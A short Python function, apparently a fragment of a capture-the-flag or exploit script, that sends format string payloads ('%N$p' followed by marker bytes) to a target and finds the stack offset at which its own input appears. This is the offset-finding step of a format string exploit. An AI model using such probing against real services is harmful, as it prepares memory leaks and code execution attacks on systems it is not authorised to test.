	def find_leak_point():
	    log.info('Finding leak point')
	    for i in range(1, 20):
	        payload ='%' + str(i) + '$p' + 'AAA' + 'BBBB'
	        r = send_payload(payload.encode())
	        print(i,r)
	        if b'0x42424242' in r: # chr(0x42) = 'B'
	            return i
